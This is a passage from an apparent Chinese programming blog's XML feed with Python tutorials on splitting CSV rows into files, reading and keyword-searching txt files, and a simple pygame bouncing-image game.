builtin">open</span><span class="token punctuation">(</span><span class="token string">'./Python期末成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 读取文件对象，得到DictReader对象，DictReader对象是一个可迭代的字典，字典的键就是表头</span>    csv_reader <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictReader<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token comment"># 可通过fieldnames属性获取表头</span>    headers <span class="token operator">=</span> csv_reader<span class="token punctuation">.</span>fieldnames    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'表头：</span><span class="token interpolation"><span class="token punctuation">{</span>headers<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">for</span> csv_row <span class="token keyword">in</span> csv_reader<span class="token punctuation">:</span>        save_path <span class="token operator">=</span>result_path <span class="token operator">+</span> csv_row<span class="token punctuation">[</span><span class="token string">'姓名'</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'.csv'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>save_path<span class="token punctuation">)</span>        <span class="token comment"># 打开'./平时成绩.csv'文件，获取文件对象，如果没有会自动创建(注意文件夹不会自动创建)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>save_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> save_file<span class="token punctuation">:</span>            <span class="token comment"># 将文件对象转换为DictWriter对象</span>            save_file_writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictWriter<span class="token punctuation">(</span>save_file<span class="token punctuation">,</span> fieldnames<span class="token operator">=</span>headers<span class="token punctuation">)</span>            <span class="token comment"># 写入表头</span>            save_file_writer<span class="token punctuation">.</span>writeheader<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 将列表中的元素写入csv文件中</span>            save_file_writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>csv_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>项目完成🐱‍🚀😎</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据分析1—txt文件读写</title>
      <link href="/2022/03/10/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%901%E2%80%94txt%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
      <url>/2022/03/10/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%901%E2%80%94txt%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="一、打开文件"><a href="#一、打开文件" class="headerlink" title="一、打开文件"></a>一、打开文件</h2><p>使用<code>open()</code>函数打开文件后，可以获得一个文件对象。</p><p>当<code>mode='r'</code>，以只读方式打开文件，默认模式。</p><p>当<code>mode='w'</code>，即写模式时，open()函数会打开一个文件只用于写入，如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被清空。如果该文件不存在，创建新文件。<br>当<code>mode='a'</code>，即追加模式时，open()函数会打开文件用于追加。如果该文件已存在，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打开目标txt文件</span>target_file <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/Python项目1—猜大小.txt'</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># 使用文件对象.read()方法读取文件内容</span>content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#关闭文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、判断文件中是否有关键词"><a href="#二、判断文件中是否有关键词" class="headerlink" title="二、判断文件中是否有关键词"></a>二、判断文件中是否有关键词</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打开目标txt文件</span>target_file <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/Python项目1—猜大小.txt'</span><span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>  <span class="token comment"># 使用文件对象.read()方法读取文件内容</span>content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 判断文件中是否有关键词</span>key_word <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要查找的关键词：'</span><span class="token punctuation">)</span><span class="token keyword">if</span> key_word <span class="token keyword">in</span> content<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'找到了，文件“</span><span class="token interpolation"><span class="token punctuation">{</span>target_file<span class="token punctuation">}</span></span><span class="token string">”中存在关键词“</span><span class="token interpolation"><span class="token punctuation">{</span>key_word<span class="token punctuation">}</span></span><span class="token string">”'</span></span><span class="token punctuation">)</span><span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#关闭文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、获得文件夹内所有文件名"><a href="#三、获得文件夹内所有文件名" class="headerlink" title="三、获得文件夹内所有文件名"></a>三、获得文件夹内所有文件名</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 设置目标文件夹路径</span>path <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/'</span><span class="token comment"># 获取文件夹下的所有文件名</span>files_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>files_list<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、筛选出所有txt文件"><a href="#四、筛选出所有txt文件" class="headerlink" title="四、筛选出所有txt文件"></a>四、筛选出所有txt文件</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 设置目标文件夹路径</span>path <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/'</span><span class="token comment"># 获取文件夹下的所有文件名</span>files_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token comment"># 筛选出所有txt文件</span><span class="token keyword">for</span> file_name <span class="token keyword">in</span> files_list<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'.txt'</span> <span class="token keyword">in</span> file_name<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'文件名：'</span><span class="token punctuation">,</span>file_name<span class="token punctuation">)</span>        file_path <span class="token operator">=</span> path <span class="token operator">+</span> file_name <span class="token comment"># 拼接出文件的相对路径</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'文件路径:'</span><span class="token punctuation">,</span>file_path<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、从全部文件中查找关键词"><a href="#五、从全部文件中查找关键词" class="headerlink" title="五、从全部文件中查找关键词"></a>五、从全部文件中查找关键词</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 从txt文件中查找是否存在关键词</span><span class="token keyword">def</span> <span class="token function">findKeyWord</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span>key_word<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打开目标txt文件</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>      <span class="token comment"># 使用文件对象.read()方法读取文件内容</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 判断文件中是否有关键词</span>    <span class="token keyword">if</span> key_word <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'找到了，文件“</span><span class="token interpolation"><span class="token punctuation">{</span>target_file<span class="token punctuation">}</span></span><span class="token string">”中存在关键词“</span><span class="token interpolation"><span class="token punctuation">{</span>key_word<span class="token punctuation">}</span></span><span class="token string">”'</span></span><span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#关闭文件</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 设置目标文件夹路径</span>    path <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/'</span>    <span class="token comment"># 获取文件夹下的所有文件名</span>    files_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    key_word <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要查找的关键词：'</span><span class="token punctuation">)</span>    <span class="token comment"># 筛选出所有txt文件</span>    <span class="token keyword">for</span> file_name <span class="token keyword">in</span> files_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'.txt'</span> <span class="token keyword">in</span> file_name<span class="token punctuation">:</span>            file_path <span class="token operator">=</span> path <span class="token operator">+</span> file_name <span class="token comment"># 拼接出文件的相对路径</span>            findKeyWord<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span>key_word<span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、txt文件写入"><a href="#六、txt文件写入" class="headerlink" title="六、txt文件写入"></a>六、txt文件写入</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token comment"># 从txt文件中查找是否存在关键词</span><span class="token keyword">def</span> <span class="token function">findKeyWord</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span>key_word<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 打开目标txt文件</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>target_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>      <span class="token comment"># 使用文件对象.read()方法读取文件内容</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 判断文件中是否有关键词</span>    <span class="token keyword">if</span> key_word <span class="token keyword">in</span> content<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'找到了，文件“</span><span class="token interpolation"><span class="token punctuation">{</span>target_file<span class="token punctuation">}</span></span><span class="token string">”中存在关键词“</span><span class="token interpolation"><span class="token punctuation">{</span>key_word<span class="token punctuation">}</span></span><span class="token string">”'</span></span><span class="token punctuation">)</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">#关闭文件</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 设置目标文件夹路径</span>    path <span class="token operator">=</span> <span class="token string">'./txt文件筛选与读写素材/'</span>    <span class="token comment"># 获取文件夹下的所有文件名</span>    files_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token comment"># 存放查询结果，以追加模式打开，这样每次写入就添加在最后，不会将原内容清空</span>    result_file <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./result.txt'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>    key_word <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要查找的关键词：'</span><span class="token punctuation">)</span>    <span class="token comment"># 筛选出所有txt文件</span>    <span class="token keyword">for</span> file_name <span class="token keyword">in</span> files_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'.txt'</span> <span class="token keyword">in</span> file_name<span class="token punctuation">:</span>            file_path <span class="token operator">=</span> path <span class="token operator">+</span> file_name <span class="token comment"># 拼接出文件的相对路径</span>            findKeyWord<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span>key_word<span class="token punctuation">)</span>            result_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>file_path <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>  <span class="token comment"># 将结果写入文件</span>    result_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#关闭文件</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python游戏开发2—生死追逐</title>
      <link href="/2022/03/06/Python%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%912%E2%80%94%E7%94%9F%E6%AD%BB%E8%BF%BD%E9%80%90/"/>
      <url>/2022/03/06/Python%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%912%E2%80%94%E7%94%9F%E6%AD%BB%E8%BF%BD%E9%80%90/</url>
      
        <content type="html"><![CDATA[<h2 id="一、初始版本"><a href="#一、初始版本" class="headerlink" title="一、初始版本"></a>一、初始版本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame<span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>init_speed <span class="token operator">=</span> <span class="token number">1</span>                   <span class="token comment"># 初始速度</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>init_speed<span class="token punctuation">,</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度） </span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span>  <span class="token comment"># 对象创建</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"thief.jpg"</span><span class="token punctuation">)</span>        <span class="token comment">#图片对象</span>imageRect <span class="token operator">=</span> image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法</span>fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span>  <span class="token comment">#键盘操作，←↓→↑改变方向</span>            <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">:</span>                speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>init_speed            <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">:</span>                speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> init_speed            <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">:</span>                speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> init_speed            <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">:</span>                speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>init_speed    imageRect<span class="token operator">=</span>imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>     <span class="token comment"># 碰壁反弹</span>    <span class="token keyword">if</span> imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>            speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>     screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>image<span class="token punctuation">,</span>imageRect<span class="token punctuation">)</span>         <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、函数封装"><a href="#二、函数封装" class="headerlink" title="二、函数封装"></a>二、函数封装</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token punctuation">,</span>pygame <span class="token comment"># 常数</span>size <span class="token operator">=</span> width<span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">800</span><span class="token punctuation">,</span><span class="token number">600</span>      <span class="token comment"># 窗体大小</span>init_speed <span class="token operator">=</span> <span class="token number">1</span>                   <span class="token comment"># 初始速度</span>speed <span class="token operator">=</span> <span class="token punctuation">[</span>init_speed<span class="token punctuation">,</span>init_speed<span class="token punctuation">]</span>  <span class="token comment"># 实际速度（横坐标速度和纵坐标速度） </span>black <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>white <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">255</span>                          fps <span class="token operator">=</span> <span class="token number">200</span><span class="token comment"># 游戏设置</span>pygame<span class="token punctuation">.</span>init<span class="token punctuation">(</span><span class="token punctuation">)</span> screen <span class="token operator">=</span> pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_mode<span class="token punctuation">(</span>size<span class="token punctuation">)</span>pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>set_caption<span class="token punctuation">(</span><span class="token string">'神偷魅影'</span><span class="token punctuation">)</span>  <span class="token comment"># 对象创建</span>image <span class="token operator">=</span> pygame<span class="token punctuation">.</span>image<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">"thief.jpg"</span><span class="token punctuation">)</span>        <span class="token comment">#图片对象</span>imageRect <span class="token operator">=</span> image<span class="token punctuation">.</span>get_rect<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#获得正切矩形对象，具有左右顶底四个属性，具有移动等方法</span>fclock <span class="token operator">=</span> pygame<span class="token punctuation">.</span>time<span class="token punctuation">.</span>Clock<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#时钟对象用于设置fps</span><span class="token comment"># 移动控制，←↓→↑改变方向</span><span class="token keyword">def</span> <span class="token function">moveControl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_LEFT<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>init_speed    <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_RIGHT<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> init_speed    <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_DOWN<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> init_speed    <span class="token keyword">if</span> event<span class="token punctuation">.</span>key<span class="token operator">==</span>pygame<span class="token punctuation">.</span>K_UP<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>init_speed<span class="token comment"># 碰壁反弹</span><span class="token keyword">def</span> <span class="token function">crashWall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> imageRect<span class="token punctuation">.</span>left <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> imageRect<span class="token punctuation">.</span>right <span class="token operator">&gt;</span> width<span class="token punctuation">:</span>            speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> imageRect<span class="token punctuation">.</span>top <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">or</span> imageRect<span class="token punctuation">.</span>bottom <span class="token operator">&gt;</span> height<span class="token punctuation">:</span>        speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span> speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token comment"># 移动</span><span class="token keyword">def</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> imageRect  <span class="token comment">#在函数内部可以访问全局变量的值，但不可修改，如要修改需先声明</span>    imageRect <span class="token operator">=</span> imageRect<span class="token punctuation">.</span>move<span class="token punctuation">(</span>speed<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>speed<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment">#正切矩形对象运动</span>    screen<span class="token punctuation">.</span>blit<span class="token punctuation">(</span>image<span class="token punctuation">,</span>imageRect<span class="token punctuation">)</span>          <span class="token comment">#将一个图像绘制在另一个图像上，使图片对象和正切矩形对象一起运动</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> event <span class="token keyword">in</span> pygame<span class="token punctuation">.</span>event<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment">#退出事件</span>        <span class="token keyword">if</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>QUIT<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> event<span class="token punctuation">.</span><span class="token builtin">type</span><span class="token operator">==</span>pygame<span class="token punctuation">.</span>KEYDOWN<span class="token punctuation">:</span> <span class="token comment">#键盘事件</span>            moveControl<span class="token punctuation">(</span><span class="token punctuation">)</span>    screen<span class="token punctuation">.</span>fill<span class="token punctuation">(</span>white<span class="token punctuation">)</span>                   <span class="token comment">#每一帧结束后都把屏幕重新刷白</span>    crashWall<span class="token punctuation">(</span><span class="token punctuation">)</span>    move<span class="token punctuation">(</span><span class="token punctuation">)</span>    fclock<span class="token punctuation">.</span>tick<span class="token punctuation">(</span>fps<span class="token punctuation">)</span>                     <span class="token comment">#设置fps</span>    pygame<span class="token punctuation">.</span>display<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">)</span>              <span class="token comment">#刷新屏幕</span><span aria-hidden="true" 